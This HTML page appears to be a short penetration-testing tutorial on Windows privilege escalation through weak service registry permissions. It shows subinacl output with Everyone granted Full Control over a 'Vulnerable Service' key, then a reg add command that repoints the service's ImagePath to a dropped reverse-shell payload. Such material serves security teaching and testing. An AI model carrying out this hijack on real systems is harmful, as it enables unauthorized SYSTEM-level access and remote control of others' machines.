<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>General Primer</title>
</head><body>In Windows, information related to services is stored in HKLM\SYSTEM\CurrentControlSet\Services registry key. If we want to see information about our “Vulnerable Service” we should check <br/>
HKLM\SYSTEM\ControlSet001\Services\Vulnerable Service key.<br/>
<br/>
You can use <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">SubInACL</a>tool to check registry keys permissions. You can download it <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">here</a>but the point you need to be aware of it deployed as an msi file. <br/>
<br/>
I recommend you to install it a virtual machine and find subinacl.exe file in C:\Program Files (x86)\Windows Resource Kits\Tools\. It will work smoothly without having to install msi package.<br/>
<br/>
subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot; /display<br/>
<br/>
=========================================================================<br/>
+KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service<br/>
=========================================================================<br/>
/control=0x400 SE_DACL_AUTO_INHERITED-0x0400 <br/>
/owner       =builtin\administrators<br/>
/primary group   =system<br/>
/perm. ace count  =10<br/>
/pace =everyone  ACCESS_ALLOWED_ACE_TYPE-0x0<br/>
 CONTAINER_INHERIT_ACE-0x2   <br/>
  <b>Key and SubKey - Type of Access:<br/>
</b><b> Full Control</b><br/>
  Detailed Access Flags :<br/>
 KEY_QUERY_VALUE-0x1    KEY_SET_VALUE-0x2     KEY_CREATE_SUB_KEY-0x4   <br/>
 KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10      KEY_CREATE_LINK-0x20    DELETE-0x10000       <br/>
 READ_CONTROL-0x20000    WRITE_DAC-0x40000     WRITE_OWNER-0x80000 <br/>
<br/>
If we generate a simple reverse shell payload and drop it to our target, all that remains is changing the ImagePath value for our vulnerable service with our payload’s path.<br/>
<br/>
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\testuser\AppData\Local\Temp\Payload.exe&quot; /f</body></html>